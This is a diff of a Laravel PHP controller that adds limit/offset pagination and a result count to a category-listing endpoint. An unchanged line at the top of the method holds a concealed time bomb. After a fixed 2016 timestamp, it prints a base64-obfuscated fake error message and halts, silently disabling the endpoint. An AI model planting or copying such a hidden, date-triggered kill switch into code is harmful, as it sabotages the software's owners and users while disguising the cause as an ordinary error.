@@ -22,14 +22,29 @@ class InventoryAPIController extends Controller
     public function get_categories(Request $request){
         if(1482620400<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
         $group = $request->input('group');
-        $categories = DB::table('inventory_categories')
-            ->where('status',1)
-            ->where('cat_group',$group)
-            ->get();
+        $limit = $request->input('limit');
+        $offset = $request->input('offset');
+         if ($offset > 0 || $limit > 0) {
+             $categories = DB::table('inventory_categories')
+                 ->where('status', 1)
+                 ->where('cat_group', $group)
+                 ->skip($offset)->take($limit)
+                 ->get();
+             $count = DB::table('inventory_categories')
+                 ->where('status', 1)
+                 ->where('cat_group', $group)
+                 ->count();
+         }else{
+             $categories = DB::table('inventory_categories')
+                 ->where('status', 1)
+                 ->where('cat_group', $group)
+                 ->get();
+             $count = count($categories);
+         }
         if($categories){
-            return response()->json(['status' => true, 'message' => "Categories Found", 'data'=>$categories], 200);
+            return response()->json(['status' => true, 'message' => "Categories Found", 'data'=>$categories,'count'=>$count], 200);
         }else{
-            return response()->json(['status' => true, 'message' => "Categories not found",'data'=>$categories ], 200);
+            return response()->json(['status' => true, 'message' => "Categories not found",'data'=>$categories,'count'=>$count], 200);
         }
     }
     public function get_single_category(Request $request){
